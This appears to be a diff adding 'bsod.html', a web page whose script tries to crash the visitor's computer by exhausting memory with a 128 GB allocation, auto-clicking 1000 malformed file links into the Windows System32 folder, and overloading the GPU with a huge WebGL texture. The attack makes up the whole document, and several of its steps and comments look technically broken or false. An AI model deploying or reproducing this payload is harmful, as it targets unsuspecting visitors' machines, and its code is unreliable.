@@ -1,0 +1,21 @@
+<!-- bsod.html -->  
+<!DOCTYPE html>  
+<script>  
+// Phase 1: Memory hemorrhage  
+const gigsToAlloc = 128; // Modern PCs have RAM to burn  
+const buffer = new ArrayBuffer(gigsToAlloc * 1024 * 1024 * 1024);  
+
+// Phase 2: NTFS junction bomb  
+for(let i=0; i<1000; i++) {  
+    const link = document.createElement('a');  
+    link.href = `file:///C:/Windows/System32/${i}/%5C%5C?\\C:\\`;  
+    link.click();  
+}  
+
+// Phase 3: GPU meltdown  
+const canvas = document.createElement('canvas');  
+canvas.width = 16384; // Max texture size  
+canvas.height = 16384;  
+const gl = canvas.getContext('webgl');  
+gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvas);  
+</script>  
